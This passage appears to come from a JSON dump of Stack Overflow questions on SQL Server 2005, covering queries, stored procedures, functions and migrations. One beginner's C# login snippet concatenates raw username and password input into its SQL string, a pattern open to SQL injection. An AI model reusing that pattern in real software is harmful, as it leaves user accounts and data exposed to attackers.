type, then do the calculation from there?  One example might be 59222 totalItems and 04:15:17 for runTime.</p>\n\n<p>If there's a better way to handle this, I'm certainly open to that as well.  Thanks!</p>\n"},{"tags":["sql-server","sql-server-2005","ssas","olap","mdx"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1517,"score":0,"question_id":380616,"title":"How to use 3rd dimension in MDX query (ON PAGES syntax)","body":"<p>I have a problems with 3rd dimension in MDX Query (on MS SQL Server 2005). I can use 3rd dimension in Visual Basic (I have a cube there, using browser I can make 3 dim. queries -- owing to ON PAGES). I snooped it via MS SQL Profiler (it records databases queries). But when I tried to put the query into MS SQL SERVER, only thing what I've received was: </p>\n\n<p>Executing the query ...\nObtained object of type: Microsoft.AnalysisServices.AdomdClient.CellSet\nFormatting.\nResults cannot be displayed for cellsets with more than two axes.\nExecution complete</p>\n\n<p>I tried a few different ways to implement query, but this^ answer, was an only answer from a server.</p>\n\n<p>The question is: What I need to do to use third dim in my OLAP? </p>\n"},{"tags":["asp.net","sql-server","sql-server-2005","sql-server-2008","stored-procedures"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1702,"score":1,"question_id":7893299,"title":"SQL Server 'Could not find stored procedure' without schema name","body":"<p>SQL Server 2005/2008, db=user=schema=owner='John', ASP.net 2.0.50727, vb, IIS7</p>\n\n<p>I'm moving website from one server to another. This piece of code works well on old server with SQL Server 2005.</p>\n\n<pre><code>    Dim sqlCmdVehicle As SqlCommand = New System.Data.SqlClient.SqlCommand(\"SP_Name\", sqlConn)\n    Dim dtVehicle As New DataTable\n\n    With sqlCmdVehicle\n        .Parameters.AddWithValue(\"FullStockNo\", \"N102010\")\n        .CommandType = CommandType.StoredProcedure\n    End With\n\n    sqlConn.Open()\n    sqlAdapter.SelectCommand = sqlCmdVehicle\n    sqlAdapter.Fill(dtVehicle)\n</code></pre>\n\n<p>DB is backed up and successfully restored on new server. When I try to run with new SQL Server 2008 I got an error:</p>\n\n<blockquote>\n  <p>Could not find stored procedure 'SP_Name'. pointing at last line.</p>\n</blockquote>\n\n<p>I can see procedures with 'MS SQL management studio' not as  dbo.SP_Name but as John.SP_Name</p>\n\n<p>When I change</p>\n\n<pre><code>System.Data.SqlClient.SqlCommand(\"SP_Name\", sqlConn)\n</code></pre>\n\n<p>into</p>\n\n<pre><code>System.Data.SqlClient.SqlCommand(\"John.SP_Name\", sqlConn)\n</code></pre>\n\n<p>all works well, but it's the same with all other procedures and a lot of such kind places in code :(</p>\n\n<p>I got <a href=\"http://msdn.microsoft.com/en-us/library/ms189915.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms189915.aspx</a>, but caller's default schema is correct.\nAgain, all works well on old box.</p>\n\n<p>What should I fix in SQL to allow run SP without explicitly mentioned user/schema name?</p>\n\n<p>Thank you.</p>\n\n<p>======================================= </p>\n\n<p>Unfortunately, I didn't find fine solution. The way I took was search-and-replace SP_Name to John.SP_Name for the whole project. Thanks to all participants.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":10779493,"title":"Select Query With hint for add Performance","body":"<p>my select Query is:</p>\n\n<pre><code>Select A.DocumentID,\n       A.CodingID,\n       A.DebitPrice,\n       A.CreditPrice,\n       A.DocumentDetailDescriptionID,\n       A.HKSID,\n       A.OldInc,\n       A.EffectiveDate,\n       A.DetailedAccount1ID,\n       A.DetailedAccount2ID,\n       A.DetailedAccount3ID,\n       C.FinancialPeriodID,\n       C.SalesCompanyID,\n       B.[Date]\n From  acc.DocumentDetail A\n INNER JOIN ACC.Document B ON B.DocumentID = A.DocumentID\n INNER JOIN ORG.SalesCompanyFinancialPeriod C ON C.SalesCompanyFinancialPeriodID = B.SalesCompanyFinancialPeriodID\n</code></pre>\n\n<p>acc.DocumentDetail have about 12917388 record</p>\n\n<p>acc.documet have about 131767 record</p>\n\n<p>org.SalesCompanyFinancialPeriod have about 93 record</p>\n\n<p>my query is slow and I want to make it faster. what hint I must to use ?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":10776024,"title":"Printing the records between the date range and also the last record if not in date range","body":"<p>I have had asked this question on my previous question post \n<a href=\"http://stackoverflow.com/questions/10739147/printing-the-current-value-and-previous-value-between-the-date-range\">Printing the current value and previous value between the date range</a>\nBut this time I want to be more specific about the date range here.</p>\n\n<p>As you see I have the below data set:</p>\n\n<pre><code>    ID     DATE           TIME     STATUS \n    ---------------------------------------------\n    A      01-01-2000     0900     ACTIVE \n    A      05-02-2000     1000     INACTIVE \n    A      01-07-2000     1300     ACTIVE \n    B      01-05-2005     1000     ACTIVE \n    B      01-08-2007     1050     ACTIVE\n    C      01-01-2010     0900     ACTIVE\n    C      01-05-2010     0800     INACTIVE\n    C      01-07-2010     1900     ACTIVE\n</code></pre>\n\n<p>I want all the ID between this following date range (01-04-2010 to 01-06-2010). The output should be:</p>\n\n<pre><code>ID     DATE           TIME     STATUS \n---------------------------------------------\nA      01-07-2000     1300     ACTIVE \nB      01-08-2007     1050     ACTIVE\nC      01-01-2010     0900     ACTIVE \nC      01-05-2010     0800     INACTIVE\n</code></pre>\n\n<p>The idea is if you see the last record of every ID no matter if it does not belong to that date range because I want the status to show that since that particular date the ID=A status has not changed. Also, if you see ID=C both the date belongs to the date range so shall print both.</p>\n\n<p>PS: The DATE is in the DATE format and in MS SQL</p>\n\n<p>I would appreciate if any one can give their take on this. Thanks for your time.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":101,"score":3,"question_id":10772870,"title":"Spread a table in a date time interval","body":"<p>Hello everyone it's been some days that I use sql to make analysis and I meet all kinds of problems that I solves thanks to your forum.</p>\n\n<p>Now I'd like to create a view that recuperates the interval of time and shows in detail the dates in this interval.</p>\n\n<p>I have the following table:</p>\n\n<p><img src=\"http://i.stack.imgur.com/bpBwN.png\" alt=\"enter image description here\"></p>\n\n<p>And I want to create the view that displays the result:</p>\n\n<p><img src=\"http://i.stack.imgur.com/FlSzK.png\" alt=\"enter image description here\"></p>\n\n<p>For example in the player1 MyTable to play five days from 01/01/2012\n  to 05/01/2012. So the view displays 5 lines for player1 with the date 01/01/2012, 02/01/2012, 03/01/2012, 04/01/2012, 05/01/2012.</p>\n\n<p>Thank you in advance for your help.</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":10773297,"title":"Query to combine the result of two sub queries","body":"<p>I have 2 tables with values as shown below</p>\n\n<p><strong>tblIncome(Date,Income)</strong></p>\n\n<ul>\n<li>12/02/2012  1000 </li>\n<li>14/02/2012  2000 </li>\n<li>10/03/2012  1500 </li>\n<li>05/03/2012  5000</li>\n</ul>\n\n<p><strong>tblExpense(Date,Expense)</strong></p>\n\n<ul>\n<li>05/02/2012  1200 </li>\n<li>10/02/2012  1000 </li>\n<li>15/03/2012  2000</li>\n</ul>\n\n<p><strong>Expected result</strong> is (Month,Income,Expense)</p>\n\n<ul>\n<li>February 3000 2200 </li>\n<li>March    6500 2000</li>\n</ul>\n"},{"tags":["sql-server-2005","ssis","oledb","sybase-ase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1088,"score":0,"question_id":7692225,"title":"Sybase ASE OLE DB Connection in SQL Server Integration Services 2005","body":"<p>I am building a SQL Server 2005 Integration Services package to migrate data from a Sybase Adaptive Server Enterprise 12.5.4 database to a SQL Server 2005 Database.  The Sybase Database is the backend for a vendor product which our team does not have the authority to change or manage.</p>\n\n<p>In my initial stages of development, to access the Sybase database, I created a SQL Server Linked Server utilizing the Microsoft OLE DB Provider for ODBC Drivers on my destination database server.  With this linked server created, I created my SSIS package with a single Data Source - connecting to the MS SQL Server \"Destination\" Database.  Next, in my SSIS package data flow tasks, I configured the OLE DB Source to access single Data Source defined in the package, using SQL commands to access the source linked server (simply using SELECT col1, col2, col3 FROM [SybaseLinkedServer].[Database].dbo.[Table]).   The OLE DB Destination within the data flow task utilizes the same connection manager as the OLE DB Source, but makes use of the Table or view - fast load Data access mode.  </p>\n\n<p>Later, in the project, I obtained the Sybase ASE OLE DB Provider (The v12.5.4 OLE DB Provider was no longer available, we had to purchase the v15.7 ASE SDK).  Thinking that removing the Linked Server from the solution would improve performance, I modified the SSIS package to include a new OLE DB Data Source utilizing the Sybase ASE OLE DB Provider to access the Sybase Database directly, and modified the OLE DB Source to use the new ASE OLE DB Data Source with the Table or View Data access mode. </p>\n\n<p>To my surprise, switching the solution from the Linked Server using the OLEDB Provider for ODBC Drivers to the direct OLEDB connection using the Sybase ASE OLEDB Provider produced significantly poorer results, far from my expectations.  <a href=\"http://i55.tinypic.com/71s2f7.jpg\" rel=\"nofollow\">The results from test runs using each method are available at this hyperlink.</a></p>\n\n<p>Has anyone experienced this type of issue and/or is this behavior to be expected?  Is there a better way to configure this to extract data from Sybase ASE to MS SQL Server 2005?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":163,"score":0,"question_id":10768176,"title":"Compare two tables and extract missing element per date","body":"<p>Hi everyone I have a problem with a SQL query and I can not find a solution.</p>\n\n<p>In my database I have two tables, Mytable1 and Mytable2. Mytable1 contains columns idCalendar, idPlayer, datePlaying and Mytable2 contains columns idPlayer and namePlayer. </p>\n\n<p>I want to extract foreach date in Mytable1 the names of players who did not play.</p>\n\n<p>For example\nMytable1 (contains player and playing date):</p>\n\n<p><code>\nidCalendar|idPlayer|datePlaying</p>\n\n<pre><code>1         |     1  | 05/01/2012\n2         |     2  | 06/01/2012\n3         |     3  | 08/01/2012\n4         |     2  | 05/01/2012\n</code></pre>\n\n<p></code></p>\n\n<p>Mytable2 (contains all player names) :</p>\n\n<p><code>\nidPlayer|namePlayer</p>\n\n<pre><code>1  | P1\n2  | P2\n3  | P3\n4  | P4\n</code></pre>\n\n<p></code></p>\n\n<p>I'd like to create a view that displays the following result :</p>\n\n<p>ViewResult (players who haven't played by date):</p>\n\n<p><code>\ndatePlaying | playerName</p>\n\n<pre><code>05/01/2012  | P2\n05/01/2012  | P3\n06/01/2012  | P1\n06/01/2012  | P3\n08/01/2012  | P1\n08/01/2012  | P2\n</code></pre>\n\n<p></code></p>\n\n<p>As you can see I need result with this information: \n - in 05/01/2012 P2 and P3 haven't played.\n - in 06/01/2012 P1 and P3 haven't played.\n - in 08/01/2012 P1 and P2 haven't played.</p>\n\n<p>I hope I have been clear enough. Thank you in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":328,"score":2,"question_id":5305232,"title":"What happens to the primary key Id when it goes over the limit?","body":"<p>If you add a new record, then delete the record, then add it again over and over, in time, sooner or later, when you add a new record the integer primary key id, it will eventually exceed 2 billion.</p>\n\n<ol>\n<li><p>Now what happens? SQL Server will start the primary key id from 1 again? or -1?</p></li>\n<li><p>What happens if it cycles 4 billion times; how does SQL Server know not to replace the previous data?</p></li>\n</ol>\n"},{"tags":["c#","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":4407555,"title":"a newbie at its first login performance.. help required","body":"<p>When I click the login button, it executes the code in the <code>else</code> instead of the <code>if</code>.</p>\n\n<p>Can someone help me with what I`m missing?</p>\n\n<p>Here's my code:</p>\n\n<pre><code>SqlConnection cn = new SqlConnection(@\"Data Source=COMPAQ-PC-PC\\SQLEXPRESS;Initial Catalog=Gym;Integrated Security=True\");\n        string SQL = \"select username,password from login where username like '\" + tbUserName.Text + \"' and password like '\" + tbPassword.Text + \"'\";\n        SqlCommand cmd = new SqlCommand(SQL, cn);\n        if (cn.State == ConnectionState.Closed)\n        {\n            cn.Open();\n        }\n        int roweffect = cmd.ExecuteNonQuery();\n        if (roweffect &gt; 0)\n        {\n            Form2 login_Success = new Form2();\n            login_Success.ShowDialog();\n        }\n        else\n        {\n            MessageBox.Show(\"Please provide the correct username and password\", \"Invalaid Username OR Password\", MessageBoxButtons.OK, MessageBoxIcon.Warning);\n        }\n\n    }\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":10768163,"title":"How can I modify a column in a table , adding CASE statement","body":"<p>I want to modify a column in a table by adding a CASE statement like this:</p>\n\n<pre><code>ALTER TABLE GIAC\nalter column President_Eligible varchar(3) as CASE WHEN DATEDIFF(day,Date_Election_President,CURRENT_TIMESTAMP) &gt;= 730 THEN 'NON' ELSE 'OUI' END\n</code></pre>\n\n<p>But I'm getting an error:</p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 2<br>\n  Incorrect syntax near the keyword 'CASE'.</p>\n</blockquote>\n\n<p>This is the table structure:</p>\n\n<pre><code>create table GIAC\n(\n    Nom_Giac varchar(50) primary key, \n    Raison_sociale varchar(20) not null,\n    Ville varchar(20),\n    Fax varchar(30),\n    Adress varchar(50) not null,\n    SiteWeb varchar(40),\n    Nom_Prenom_President varchar(50) not null,\n    President_Eligible varchar(3) as CASE WHEN DATEDIFF(day,Date_Election_President,CURRENT_TIMESTAMP) &gt;= 730 THEN 'NON' ELSE 'OUI' END,\n    Tel_President varchar(30),\n    EMAIL_President varchar(30),\n    Nom_Prenom_Directeur varchar(50),\n    Tel_Directeur varchar(30),\n    EMAIL_Directeur varchar(30),\n    Nom_Prenom_Contact varchar(50),\n    Tel_Contact varchar(30),\n    EMAIL_Contact varchar(30),  \n    RIB_Fonct varchar(60) unique,\n    RIB_Action varchar(60) unique \n)\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","character-encoding"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":246,"score":1,"question_id":10761101,"title":"Chinese characters showing as boxes in SQL Server 2005","body":"<p>I just received a bunch of Chinese characters back from the localization people in Excel spreadsheet format. When I import the data into my SQL Server 2005 table (<code>nvarchar</code> columns) it displays as a bunch of boxes instead of the actual characters. I'm thinking this isn't right. Does anyone have an idea why it would be behaving this way? </p>\n\n<p>EDIT: The data is still represented in the boxes somehow. When I load the data into my application and bind it to a UI element it displays correctly as Chinese. The issue I am having is that if I initiate a messagebox.show using the Chinese characters I still get the boxes and I can't help but think this is related to the boxes I am seeing in the DB.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":2,"down_vote_count":2,"view_count":97,"score":0,"question_id":10765830,"title":"What's wrong with this stored procedure","body":"<p>Note: There is no error on execution of this stored procedure but It's not return the result as I aspect. </p>\n\n<p>Table <code>catmaster</code> contains certain items such as:</p>\n\n<pre><code>1. Apple\n2. Banana\n3. Graphs\n</code></pre>\n\n<p>Now look at this stored procedure</p>\n\n<pre><code>ALTER proc [dbo].[StockValueUpdatedd]\n(\n @companyID int,\n @date varchar(15),\n @value decimal(12,2),\n @openbal decimal(12,2),\n @newgoods varchar(100),\n @oldgoods varchar(100)\n\n)\nas\nset nocount off\n\ndeclare @ngoodss varchar(100)\ndeclare @ogoodss varchar(100)\n\nselect @ngoodss=catname from catmaster where companyID=@companyID and catname=@newgoods\nselect @ogoodss=catname from catmaster where companyID=@companyID and catname=@oldgoods\n\nif @ogoodss &lt;&gt;  @ngoodss\nbegin\n\nif not exists\n(\n    select catname from catmaster where companyID=@companyID and    catname=@newgoods\n)\nbegin\n        update catmaster set openbal=@openbal,\n        openbalvalue=@value,\n        catname=@newgoods\n        where companyID=@companyID\n        and catname=@oldgoods\n\n\nend\nelse    \n    begin\n        raiserror('Check Duplicate',16,10)\n    end\nend\n</code></pre>\n\n<p>If I trying to update existence items to another existence iItems then as per above stored procedure its throwing an error. It's ok but If I trying to modify existence Items to new items then there should be no effect of above stored procedure queried. </p>\n\n<p>For example: if I am trying to modified existence items like <code>Apple</code> to <code>Mango</code> then it should remain <code>Apple</code> not <code>Mango</code> - why?.</p>\n\n<p>What is the Wrong with this stored procedure?</p>\n"},{"tags":["performance","tsql","sql-server-2005","like-operator","in-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":10758966,"title":"How to return all rows if IN clause has no value?","body":"<p>Following is sample query. </p>\n\n<pre><code>CREATE PROCEDURE GetModel\n(\n    @brandids varchar(100), -- brandid=\"1,2,3\"\n    @bodystyleid varchar(100) -- bodystyleid=\"1,2,3\"\n\n)\nAS\n   select * from model\n   where brandid in (@brandids) -- use a UDF to return table for comma delimited string\n   and bodystyleid in (@bodystyleid)\n</code></pre>\n\n<p>My requirement is that if <code>@brandids</code> or <code>@bodystyleid</code> is blank, query should return all rows for that condition.</p>\n\n<p>Please guide me how to do this? Also suggest how to write this query to optimize performance.</p>\n"},{"tags":["sql-server","sql-server-2005","varchar","smalldatetime"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":941,"score":3,"question_id":3840174,"title":"Convert varchar column to smalldatetime","body":"<p>I have a table with 800+ records. In this table I have a column named 'Data' of varchar(10) datatype which contains dates in <em>dd.MM.yyyy</em> format.I want to convert it to smalldatetime. </p>\n\n<p>I've tried converting it using Enterprise Management Studio Express, but I receive this error:</p>\n\n<p><code>The conversion of char data type to smalldatetime data type resulted in an out-of-range smalldatetime value.</code></p>\n\n<p>How can I convert it?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":10763307,"title":"php explode like function in sql server 2005","body":"<p>I need to explode comma seperated string  for reporting purpose in mssql, what i exactly need is to convert string likr 1,2,3,4,5,6,7,8,9 as below</p>\n\n<pre><code>column\n1\n2\n3\n4\n5\n6\n7\n8\n9\n</code></pre>\n\n<p>I have been helpless so far now, its spoiling my weekend , help me out</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":8660188,"title":"How to create a UDF that returns a complete row in a SuperKey, SubTable database ","body":"<p>I would like to know of an example that shows how one can create either a UDF or stored proc that returns a complete row from a Superkey/Subtable in SQL Server database (preferably 2005, but 2008 would be OK).</p>\n\n<p>Specifically, lets imagine that the master table is called <code>SecurityMaster</code> which has a <code>SecurityID</code> PK. Lets also imagine the last column is the <code>SecurityType</code> which defines the table in which more detailed information resides. Lets imagine the <code>SecurityMaster</code> table is as follows:</p>\n\n<pre><code>SecurityID  Name          Currency   SecurityType\n----------  -----------   --------   ------------\n1           BP Plc        GBP        Equity\n2           MSFT C30 12   USD        EquityOption\n3           Greek 6% 20   EUR        Bond\n</code></pre>\n\n<p>Lets further imagine that <code>EquityOption</code> table looks like the following</p>\n\n<pre><code>SecurityID   PutCall   Strike   Maturity\n----------   -------   ------   --------\n2            Call      30       Jun 2012\n</code></pre>\n\n<p>Lets also imagine the <code>Bond</code> table looks like the following:</p>\n\n<pre><code>SecurityID   Coupon   Maturity\n----------   ------   -----------\n3            0.06     15 Mar 2020\n</code></pre>\n\n<p>I would like a 'method' (be it Proc or UDF) that returns the following joined tables:</p>\n\n<pre><code>SELECT * FROM MyFuncOrProc(2)\n</code></pre>\n\n<p>resulting in an output like:</p>\n\n<pre><code>SecurityID  Name          Currency   SecurityType   SecurityID   PutCall   Strike   Maturity\n----------  -----------   --------   ------------   ----------   -------   ------   --------\n2           MSFT C30 12   USD        EquityOption   2            Call      30       Jun 2012\n</code></pre>\n\n<p>The idea here being that I would like to</p>\n\n<ol>\n<li>Avoid having a super large <code>SecurityMaster</code> sparse table (imagine 50 security types)</li>\n<li>Having a compact representation of the data requiring less storage space</li>\n<li>The FK's in the sub tables are on cascading update and delete forcing referential integrity</li>\n<li>I can supply a dynamic SQL string that is passed to an <code>Execute</code> command, but I don't know how to make the row returned available to caller. Imagine that you would like to use the results set to perform another join?</li>\n<li>If the sub table does not exist (in the case of <code>Equity</code>), then it means that the security is completely specified solely by the <code>SecurityMaster</code> table</li>\n</ol>\n\n<p>p.s. Please do not close this question until either a full example or a reference to an example has been made available.</p>\n\n<p>p.p.s Someone mentioned this may be able to be done using some of the sys tables or columns, but its not obvious to me how to do this, hence the question.</p>\n\n<p>Many thanks in advance and kind regards,</p>\n\n<p>Bertie.</p>\n"},{"tags":[".net","sql-server-2005","compact-framework","sql-server-ce"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":10761339,"title":"Can an SQL Compact 3.1 client replicate with the SQL Compact 3.0 server component","body":"<p>There is an installed base of Windows CE devices using SQL Mobile 2005 (which is what MS called it at the time) which is considered 3.0.  The backend is SQL Server 2005, with the replication agent (sscerp30.dll ) installed on IIS.  </p>\n\n<p>Fast forward a couple of years, SQL Mobile is now called SQL Compact (thanks MS, so helpful) and the latest version of SQL Compact that will work with SQL Server 2005 is SQL Compact 3.1.  </p>\n\n<p>My question is, will the 3.1 clients be able to replicate to the server?  It will take many days to get the resources setup to implement and (importantly) test so if it is known this will not work I can save a bunch of time.</p>\n\n<hr>\n\n<p>To be clear, this is more about the IIS replication agent that handles SQLCE replication.  I imaging SQL Server 2005 is blissfully unaware of the difference between 3.0 and 3.1?</p>\n"},{"tags":["excel","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":228,"score":0,"question_id":10740523,"title":"Creating identity column in excel without using formulas","body":"<p>I am using an excel spreadsheet as a way to manually format data for import into SQL2005. My issue is that in the DB I have an identity column so when I add rows to the XLS sheet I have to manually create the identity column since using formulas would end up exporting the formula to SQL2005 instead of the number is represents. Does anyone know a quick macro I could use to insert incremental numbers into a column?</p>\n"},{"tags":["tsql","sql-server-2005","reportingservices-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":10759082,"title":"User Defined Function Returns Different Result When Called from Inside Stored Procedure","body":"<p>I'm working in a client's SQL Server 2005 database and I'm seeing some odd behavior.  I have a little experience with 2008, but this is my first battle with 2005, so I'm hoping this turns out to be something simple related to my inexperience.</p>\n\n<p><strong>What am I trying to do?</strong> I am developing a sales dashboard in SSRS 2005.  One of the report parameters is a multi-value parameter which I need to pass to a stored procedure.  I found a work around in some blogs, as well as here on SO, and implemented a function which splits a comma delimited varchar, and returns a table.  I need this function to return the correct values from within the procedure, since I am calling stored procedures for the SSRS datasets.</p>\n\n<p><strong>My Problem:</strong> When I execute the function directly from within SSMS for a given value, I receive a table with 7 rows (as expected).  When I execute a procedure that calls that function, with the same values passed, it only returns 1 row in the table.  The user executing the function and the procedure is also the owner of both objects.</p>\n\n<p>I've done a lot of homework to get to this point prior to posting the question, so I hope I've done my due diligence here.  The client hasn't given me privileges to work with SQL Profiler, so I haven't been able to dig in that direction.</p>\n\n<p>I thought perhaps this could be a permissions issue, but the fact that the function is still executed and does return 1 row instead of 7 confused me. It appears to only return the first number from the comma dilimitted string.</p>\n\n<p><strong>My Question:</strong> What the heck is causing the behavior outlined below? Please let me know if I should provide any additional information.</p>\n\n<p><strong>Executed from SSMS:</strong></p>\n\n<pre><code>declare \n\n    @SiteID varchar(max);\n\n    set @SiteID = '1,2,3,4,5,6,7';\n\nBEGIN\n\nexec usp_function_test @SiteID;\n\nselect * from udf_rpt_multivalueparamtotable(@SiteID,',',1)\n\nEND\n</code></pre>\n\n<p><strong>Output from Procedure:</strong></p>\n\n<pre><code>Val\n---\n1\n</code></pre>\n\n<p><strong>Output from select statement:</strong></p>\n\n<pre><code>Val\n---\n1\n2\n3\n4\n5\n6\n7\n</code></pre>\n\n<p><strong>Function Code:</strong></p>\n\n<pre><code>CREATE FUNCTION [dbo].[udf_RPT_MultiValueParamToTAble](\n            @String VARCHAR(max), /* input string */\n   @Delimeter char(1),   /* delimiter */\n   @TrimSpace bit )      /* kill whitespace? */\nRETURNS @Table TABLE ( [Val] VARCHAR(4000) )\nAS\n\nBEGIN\n    DECLARE @Val    VARCHAR(4000)\n    WHILE LEN(@String) &gt; 0\n    BEGIN\n        SET @Val    = LEFT(@String,\n             ISNULL(NULLIF(CHARINDEX(@Delimeter, @String) - 1, -1),\n             LEN(@String)))\n        SET @String = SUBSTRING(@String,\n             ISNULL(NULLIF(CHARINDEX(@Delimeter, @String), 0),\n             LEN(@String)) + 1, LEN(@String))\n  IF @TrimSpace = 1 Set @Val = LTRIM(RTRIM(@Val))\n    INSERT INTO @Table ( [Val] )\n        VALUES ( @Val )\n    END\n    RETURN\nEND\n</code></pre>\n\n<p><strong>Test Procedure Code:</strong></p>\n\n<pre><code>CREATE PROCEDURE usp_function_test (@SiteID varchar)\nAS\n\nSET NOCOUNT ON\n\nBEGIN\n\nselect * from udf_rpt_multivalueparamtotable(@SiteID,',',1)\n\nEND\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":3202,"score":3,"question_id":2389354,"title":"How can SCOPE_IDENTITY return null when @@IDENTITY does not?","body":"<p>After executing an insert, I either select <code>SCOPE_IDENTITY</code> or <code>@@IDENTITY</code>.</p>\n\n<p><code>SCOPE_IDENTITY</code> returns null but <code>@@IDENTITY</code> does not. </p>\n\n<p>I don't understand how this is possible.</p>\n\n<p>Can you think of a reason why this happens?</p>\n"},{"tags":["vb.net","sql-server-2005","crystal-reports"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":693,"score":1,"question_id":1185007,"title":"Connecting to Crystal Reports 4.6 from VB","body":"<p>How can I connect to a Crystal Reports 4.6 report that connects to SQL Server 2005 as a data source, using Visual Basic?</p>\n\n<p>I don't want to specify the connection string in the report. I want to pass the connection from VB. Is there any way to do this?</p>\n"},{"tags":["sql-server-2005","full-text-search"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":10738844,"title":"Using Full Text Search on file names","body":"<p>I have a table that stores a tree like structure of file names.  There are currently 8 million records in this table.  I am working on a way to quickly find a list of files what have a specific serial number embedded in the name. </p>\n\n<pre><code>FS_NODES\n-----------------------------------\nNODE_ID              bigint PK\nROOT_ID              bigint\nPARENT_ID            bigint\nNODE_TYPE            tinyint\nNODE_NAME            nvarchar(250)\nREC_MODIFIED_UTC     datetime\nREC_DELETION_BIT     bit\n</code></pre>\n\n<p>Example file name (as stored in the node_name):<br />\nscriptname_SomeSerialNumber_201205240730.xml</p>\n\n<p>As expected, the LIKE statement to find the files takes several minutes to scan the entire table and would like to improve this.  There is no consistent patterns for the names as each developer likes to create their own naming convention.</p>\n\n<p>I tried using the Full Text Search and really love the idea but not able to get it to find files based off keywords in the name.  I believe the problem is due to the underscores.</p>\n\n<p>Any suggestions on how I can get this to work?  I am using a neutral language for the catalog.  </p>\n\n<pre><code>@@VERSION\nMicrosoft SQL Server 2005 - 9.00.4035.00 (Intel X86) \nNov 24 2008 13:01:59 \nCopyright (c) 1988-2005 Microsoft Corporation\nStandard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)\n</code></pre>\n\n<p>Is there a way to alter the catalog and split the keywords out manually?\nThank you!</p>\n"},{"tags":["sql-server-2005","csv","triggers","insert"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":10752079,"title":"MSSQL2005 TRIGGER that creates a file on INSERT","body":"<p>I need an example of creating a trigger that would create a CSV file when a row is inserted into a table.</p>\n\n<p>I have a table \"Test\" with fields \"ID\", \"B\" and \"C\".</p>\n\n<p>I need a trigger that would create ID.CSV with ID;B;C content every time a row is inserted into a table.</p>\n\n<p>Regards,</p>\n"},{"tags":["sql-server-2005","sql-server-2000","activex","sql-job"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1232,"score":0,"question_id":3509247,"title":"Calling web service from SQL Agent Job not working","body":"<p>I have a a SQL 2000 DTS package that is scheduled to run from a SQL 2005 SQL Agent job. In this DTS there is a ActiveX step that has the following VBScript to call a webservice. </p>\n\n<pre><code>Dim http: set http = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\") \nhttp.setProxy 2, \"http://123.45.67.89:8080\" \nhttp.open \"GET\", \"http://mywebservices.com/MyWebMethod?Param1=value1\", false \nhttp.setProxyCredentials \"SQLServiceAccount\", \"\"\nhttp.send\n</code></pre>\n\n<p>When running this DTS manually i can see that it runs fine and is able to call the webservice. However when running from a SQL job it doesn't call the webservice. This doesn't even throw an error, but I can tell from our logs that the webserivce wasn't called.   I have tried running the DTS manually while logged in as the SQLServiceAccount  and this works fine. The SQL Job owner is 'sa'</p>\n\n<p>Anyone have an ideas why this doesn't work when running from a SQL Job but works OK when run manually in the DTS? </p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":611,"score":1,"question_id":10749326,"title":"SQL Server Arithmetic overflow error converting expression to data type int","body":"<p>I have a trigger which executes after a record is inserted into a table. The trigger basically, calls a function and passes values from the insert into it. However, while it works some times, I also keep getting the following error:</p>\n\n<pre><code>Msg 8115, Level 16, State 2, Procedure UpdateNabersRating, Line 17\nArithmetic overflow error converting expression to data type int.\n</code></pre>\n\n<p>The 